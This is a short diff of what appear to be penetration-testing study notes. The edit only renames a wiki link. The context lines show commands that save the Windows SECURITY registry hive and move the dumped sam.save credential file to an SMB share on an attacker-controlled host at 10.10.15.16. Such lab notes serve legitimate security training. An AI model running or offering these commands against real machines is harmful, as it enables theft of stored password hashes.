@@ -28,7 +28,7 @@ C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
 The operation completed successfully.
 ```
 
-we can use [[SMB  windows]] to transfer the files. once the server is setup in our attack host:
+we can use [[file transfers/SMB]] to transfer the files. once the server is setup in our attack host:
 ```
 C:\> move sam.save \\10.10.15.16\CompData
         1 file(s) moved.
